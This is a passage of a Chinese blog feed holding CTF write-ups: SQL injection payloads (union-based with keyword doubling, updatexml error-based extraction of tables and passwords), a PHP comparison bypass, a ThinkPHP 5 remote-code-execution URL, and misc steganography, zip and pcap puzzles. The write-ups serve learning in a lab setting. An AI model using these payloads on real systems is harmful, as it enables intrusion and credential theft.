‘id,username,password’</strong></p><p>读取列中的字段</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#</code></pre><p>flag{363a0dd2-accf-4355-878e-84eaf3f6f674}</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>updatexml()，extractvalue()报错注入解决问题，经过我分析，这两个报错函数语句相同。</p><p>分析语句：</p><p>database()</p><p>select(())</p><p>concat(0x7e,(),0x7e)</p><p>undatexml(1,,1)</p><p>extractvalue(1,,1)</p><p>注入句式：</p><pre><code>admin&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>geek</del>‘</strong>（数据库）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>H4rDsq1</del>‘</strong>（表）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>id,username,password</del>‘</strong></p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(passWord))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘~flag{576fb8c1-905c-4202-8f82-60’</strong></p><p>只是得到了一半flag</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：XPATH syntax error: ‘<del>1-905c-4202-8f82-605354bf4c57}</del>‘</p><p>flag{576fb8c1-905c-4202-8f82-605354bf4c57}</p><p>嘶~不错</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><p>starsnowctf：<a href="http://ctf.starsnowsec.cn/challenges" target="_blank" rel="noopener">http://ctf.starsnowsec.cn/challenges</a></p><h2 id="Rao"><a href="#Rao" class="headerlink" title="Rao"></a>Rao</h2><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))  {    if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)    {      exit(&#39;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#39;);    }    elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)    {      if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)      {        if (!is_array($_POST[&#39;yingzi&#39;])) {        include(&quot;./flag.php&quot;);        echo &quot;Congratulations! FLAG is : &quot;.$flag;        }        else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }      }      else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }    }    else    {      exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);    }  }}show_source(__FILE__);?&gt;</code></pre><p>逐一分析：</p><p>1.首先</p><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))</code></pre><p>判断是否设置了这两个参数</p><p>2.其次</p><pre><code>if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)</code></pre><p>将参数yingzi里面的值进行正则匹配，这就意味着必须是26英文字母大小写+数字</p><p>3.然后</p><pre><code> elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)</code></pre><p>判断yingzi传的参数长度是否小于10同时满足yingzi传入的参数数值大于987654321</p><p>4.再就是</p><pre><code> if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)</code></pre><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p><strong>注释：</strong>strpos() 函数对大小写敏感。</p><pre><code>strpos(string,find,start)string    必需。规定要搜索的字符串。find    必需。规定要查找的字符串。start    可选。规定在何处开始搜索。</code></pre><p>也就是说利用这个来检索yingzi中是否含有#BIG#</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A52148_2.png" alt></p><p>Congratulations! FLAG is : flag{rao_rao_rao}</p><p>解释：9e99=9*10^99</p><h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞：</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><h2 id="Mini-httpd-2018"><a href="#Mini-httpd-2018" class="headerlink" title="Mini_httpd 2018"></a>Mini_httpd 2018</h2><pre><code>GET /flag HTTP/1.1Host: Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close</code></pre><p>l漏洞复现：</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106854028" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106854028</a></p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Misc</title>
      <link href="/2021/01/15/buuctf-zhi-misc/"/>
      <url>/2021/01/15/buuctf-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载得到QR_code.png图片，扫码得到secret is here，但并非flag。</p><p>但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码</p><p>因为文件名字是4number所以爆破得到密码7639，解压得到flag：CTF{vjpw_wnoei}</p><p>改为flag{vjpw_wnoei}提交成功</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>也是一个改后缀的题，改为txt得到</p><pre><code>data:image/jpg;base64,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</code></pre><p>要是我记得没错应该是base64和图片的转换，得到二维码一张扫一下得：KEY{dca57f966e4e4e31fd5b15417da63269}</p><p>flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>提示：看不到图？ 是不是屏幕太小了 </p><p>意思就是说这个图下面还有一半没显示出来</p><p>用winhex打开</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p><p>将67改为与23相同的02和A7（修改高度和宽度相同）然后得到flag{He1l0_d4_ba1}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>tmd，又是一道图片隐写题</p><p>winhex打开看看，直接Ctrl+f就找到了</p><p>flag{stego_is_s0_bor1ing}</p><h1 id="2021-1-16"><a href="#2021-1-16" class="headerlink" title="2021/1/16"></a>2021/1/16</h1><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>提示：给你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对= =我说了什么了不得的东西。。 </p><p>一看是四位数的密码，ARAR直接爆破</p><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><p>这个题说来也巧，我刚在u盘里面发现一个没用的图片并且把它删了，结果下一题（这个题）就是我删掉的图片</p><p>winhex直接过</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><h3 id="关于stegsolve的使用："><a href="#关于stegsolve的使用：" class="headerlink" title="关于stegsolve的使用："></a>关于stegsolve的使用：</h3><p>File Format:文件格式，这里可以看见图片的具体信息有时候有些图片隐写的flag会藏在这里</p><p>Data Extract:数据提取，用于提取RGB数据信息</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，把动图一帧帧的放</p><p>Image Combiner:拼图，图片拼接</p><h4 id="关于版块Data-Extract"><a href="#关于版块Data-Extract" class="headerlink" title="关于版块Data Extract"></a>关于版块Data Extract</h4><p>Data Extract:(好多涉及到数据提取的时候，很多博主在wp中都是一带而过，小白们还以为要一个个试。。)</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51639_1.png" alt></p><p> 左边一大部分主要是讲了RGBA（Alpha是透明度）的颜色通道</p><p>为了方便理解我们分开说</p><p>RGB是红绿蓝 但他们的值代表的实际上是亮度</p><p>R的数字越大，则代表红色亮度越高；R的数字越小，则代表红色亮度越低。G，B同理</p><p>R的亮度各有256个级别，GB同理。即从0到255，合计为256个。从数字0到255的逐渐增高，我们人眼观察到的就是亮度越来越大，红色、绿色或蓝色越来越亮。然而256是2的8次方 所以你会看见上图的7~0 一共8个通道</p><p>而Alpha就是透明度 该通道用256级灰度来记录图像中的透明度信息，定义透明、不透明和半透明区域</p><p>alpha的值为0就是全透明，alpha 的值为 255 则表示不透明</p><p>因此左半部分就理解了</p><p>右半部分就是Extra By(额外的)和Bit Order（位顺序）和Bit Plane Order（位平面的顺序）</p><p>1）.Extra By(额外的)：分为row（行）和column（纵）</p><p>  每个像素用R，G，B三个分量表示，那么一张图片就像一个矩阵，矩阵的每个单位就是（0<del>255，0</del>255，0~255）</p><p>  也就会有是纵排列和行排列了，一般事先访问行再访问列（如果相反会引起ve使用方法）</p><p>￼2）.Bit Order（位顺序）:MSB是一串数据的最高位，LSB是一串数据的最低位。</p><p>3）.Bit Plane Order（位平面的顺序)</p><p>   整个图像分解为8个位平面，从LSB(最低有效位0)到MSB（最高有效位7）随着从位平面0 到位平面7，位平面图像的特征逐渐变得复杂，细节不断增加。（一般我们的图片如果是RGB那么就是24位 3乘8嘛）</p><p>4）Bit Plane Order（位平面的顺序）:一般图片是24位 也就是3个8 大家可以想像成三明治 比如BGR就是B为三明治第一层 G为第二层 R为第三层。</p><h3 id="关于此题：LSB"><a href="#关于此题：LSB" class="headerlink" title="关于此题：LSB"></a>关于此题：LSB</h3><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51645_2.png" alt></p><p>save bin格式为png后，会发现这是一样二维码，扫码得到cumtctf{1sb_i4_s0_Ea4y}</p><p>flag{1sb_i4_s0_Ea4y}</p><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><p>得到一个jpeg后缀的图片</p><p>原来flag藏在文件的属性里面啊</p><h1 id="2021-1-17"><a href="#2021-1-17" class="headerlink" title="2021/1/17"></a>2021/1/17</h1><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>提示：这个是一个rar文件，里面好像隐藏着什么秘密，但是压缩包被加密了，毫无保留的告诉你，rar的密码是4位纯数字。</p><p>爆破就ok</p><p>密码：8795</p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>提示：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)</p><p>直接搜索password，找到对应的value就是flag</p><p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>得到一个二维码</p><p>扫码即可flag{878865ce73370a4ce607d21ca01b5e59}</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>知识点补充：</p><h3 id="来了解一下ZIP文件的组成"><a href="#来了解一下ZIP文件的组成" class="headerlink" title="来了解一下ZIP文件的组成"></a><strong>来了解一下ZIP文件的组成</strong></h3><p>一个 ZIP 文件由三个部分组成：<br>　　压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><h4 id="a-压缩源文件数据区："><a href="#a-压缩源文件数据区：" class="headerlink" title="a.压缩源文件数据区："></a>a.压缩源文件数据区：</h4><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500</p><h4 id="b-压缩源文件目录区"><a href="#b-压缩源文件目录区" class="headerlink" title="b.压缩源文件目录区:"></a>b.压缩源文件目录区:</h4><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><strong>00 00：全局方式位标记（有无加密，奇数加密，偶数无加密）</strong><br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001</p><h4 id="c-压缩源文件目录结束标志"><a href="#c-压缩源文件目录结束标志" class="headerlink" title="c.压缩源文件目录结束标志:"></a>c.压缩源文件目录结束标志:</h4><p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 1A：ZIP 文件注释长度</p><p>在这个010工具里面他会自动识别并且给你，这里针对我的加粗字体的地方进行修改，基本就是位于14 00后面，保存再次打开就没加密了flag{Adm1N-B2G-kU-SZIP}</p><h1 id="2021-1-18"><a href="#2021-1-18" class="headerlink" title="2021/1/18"></a>2021/1/18</h1><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>foremost跑一下得到</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8820%E6%97%A50026_1.png" alt></p><p>根据题目所说的4位数，我们直接进行爆破得到密码8368的打开文件得到flag{b025fc9ca797a67d2103bfbc407a6d5f}</p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>得到图片名字叫steg</p><p>所以用stegsolve打开lsb隐写(在red plane 0处，左上角有无规则点)终结题目</p><p>flag{st3g0_ saurus_wr3cks}</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>tip：某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？</p><p>直接wireshark查找flag，ctrl+d找到与之对应的分组详情，右键显示分组字节即可flag{da73d88936010da1eeeb36e945ec4b97}</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>提示：小明有一个保险箱，里面珍藏了小明的日记本，他记录了什么秘密呢？。。。告诉你，其实保险箱的密码四位纯数字密码。</p><p>得到的图片改为.zip后缀，直接爆破即可7869</p><p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p><h1 id="2021-1-19"><a href="#2021-1-19" class="headerlink" title="2021/1/19"></a>2021/1/19</h1><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>得到文件jpg</p><p>winhex打开发现了里面说有flag.txt</p><p>那么用foremost分离肯定会得到东西</p><pre><code>-V  - 显示版权信息并退出-t  - 指定文件类型.  (-t jpeg,pdf ...) -d  -打开间接块检测 (针对UNIX文件系统) -i  - 指定输入文件 (默认为标准输入) -a  - 写入所有的文件头部, 不执行错误检测(损坏文件) -w  - 向磁盘写入审计文件，不写入任何检测到的文件-o  - 设置输出目录 (默认为为输出)-c  - 设置配置文件 (默认为 foremost.conf)-q  - 启用快速模式. 在512字节边界执行搜索.-Q  - 启用安静模式. 禁用输出消息. -v  - 详细模式. 向屏幕上记录所有消息。</code></pre><p>分离得到zip文件，有密码，在文件属性里面发现this_is_not_password其实这个就是密码，mad还摆我一道</p><p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>pcap文件用wireshark打开发现都是tcp文件，而且好像是从偶数开始，每个包都带有data的一点点小数据FLAG:385b87afc8671dee07550290d16a8071</p><p>flag{385b87afc8671dee07550290d16a8071}</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>用winhex打开在最后发现了二进制编码01101011011011110110010101101011011010100011001101110011</p><p>分割：01101011 01101111 01100101 01101011 01101010 00110011 01110011</p><p>得到koekj3s就是flag</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>提示：请将 hctf 替换为 flag 提交，格式 flag{}</p><p>lsb隐写分离得到文件，改为zip格式，解压得到无后缀文件1，winhex打开得到：</p><p>hctf{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><p>flag{dd0gf4c3tok3yb0ard4g41n<del>~</del>}</p><h1 id="2021-1-20"><a href="#2021-1-20" class="headerlink" title="2021/1/20"></a>2021/1/20</h1><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p>得到一张路飞的图片</p><p>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</p><p>flag{377cbadda1eca2f2f73d36277781f00a}</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>得到一张图片，我怀疑上面是盲文解密</p><p>得到：kmdonowg</p><p>这个一定就是music压缩包的密码，结果打开以后一听，里面是莫斯电码的性质，用到工具audacity得到电码：</p><p>-.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –..</p><p>解码：</p><p>CTFWPEI08732?23DZ</p><p>flag{wpei08732?23dz}</p><h2 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h2><p>继续winhex打开<br>发现少了png的文件头。<br>于是添加上去（复制粘贴：塒NG)←89 50 4E 47</p><p>得到完整图片也就是424A447B79316E677A756973687561697D</p><p>BJD{y1ngzuishuai}</p><h2 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h2><p>得到图片使用<code>010 editor</code>打开的时候出现<code>CRC</code>匹配错误</p><p>总结：这种错误意思就是图片的高度被修改过</p><p>改前：<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_1.png" alt></p><p>改后：</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8822%E6%97%A51451_2.png" alt></p><p>然后就会看到flag</p><p>BJD{PnG_He1ghT_1s_WR0ng}</p><p>flag{PnG_He1ghT_1s_WR0ng}</p><p>文件头格式：</p><p>JPEG (jpg)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：FFD8FF</p><p>PNG (png)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：89504E47</p><p>GIF (gif)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" rel="noopener">文件</a>头：47494638</p><p>ZIP Archive (zip)， <a href="http://baike.baidu.com/view/345685.htm" target="_blank" 